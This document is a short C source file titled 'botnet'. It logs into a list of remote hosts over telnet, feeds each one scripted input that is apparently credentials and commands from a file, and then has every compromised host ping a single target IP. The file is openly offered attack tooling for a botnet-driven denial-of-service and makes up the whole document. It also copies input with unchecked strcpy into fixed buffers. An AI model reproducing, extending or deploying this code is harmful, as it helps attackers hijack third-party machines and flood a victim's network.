//
//  main.c
//  botnet
//
//  Created by fairy-slipper on 4/10/16.
//  Copyright © 2016 fairy-slipper. All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <string.h>
#include <signal.h>
#include <fcntl.h>
#include <ctype.h>
#include <unistd.h>
#include <stdarg.h>
#include <time.h>
#include <sys/time.h>
#include <pthread.h>
#include <sched.h>

pid_t pid[1000];
int status;

int oldin;
int oldout;
char addrscript[100];
char targetip[100];

void ctrlc_handler() {
    for(int i=0; i<1000; i++) {
        kill(pid[i], SIGINT);
    }
    dup2(oldout, 1);
    close(oldout);
    dup2(oldin, 0);
    close(oldin);
    exit(0);
}

int main(int argc, const char *argv[]) {
    
    if (argc != 2) {
        printf("\n./botnet <addrscript>\n");
        exit(0);
    }
    
    signal(SIGINT, ctrlc_handler);
    strcpy(addrscript, argv[1]);
    FILE *scriptfd = fopen(addrscript, "r+");
    
    char buf[1000];
    fgets(buf,1000, scriptfd);
    strcpy(targetip, buf);
    fgets(buf,1000, scriptfd);
    
    int i = 0;
    while (fgets(buf,1000, scriptfd)!=NULL) {
        int fdp[2];
        pipe(fdp);
        pid[i] = fork();
        if (pid[i] == 0) {
            i++;
            oldin = dup(0);
            dup2(fdp[0], STDIN_FILENO);
            close(fdp[0]);
            const char t[2] = " \n";
            char *token = strtok(buf, t);
            char *execArgs[] = {"telnet", token, NULL};
            int botSpawn = execvp(execArgs[0], execArgs);
        } else {
            oldout = dup(1);
            dup2(fdp[1], STDOUT_FILENO);
            close(fdp[1]);
            sleep(5);
            while (fgets(buf,1000, scriptfd)!=NULL) {
                
                if (!isspace(buf[0])) {
                    const char t[2] = " \n";
                    char *token = strtok(buf, t);
                    strcat(token, "\r");
                    write(STDOUT_FILENO, buf, strlen(buf));
                } else {
                    char ping[100];
                    strcpy(ping, "ping ");
                    strcat(ping, targetip);
                    strcat(ping, "\r");
                    write(STDOUT_FILENO, ping, strlen(ping));
                    dup2(oldout, 1);
                    close(oldout);
                    break;
                }
                sleep(5);
            }
        }
    }
    waitpid(-1, &status, 0);
    return 0;
}
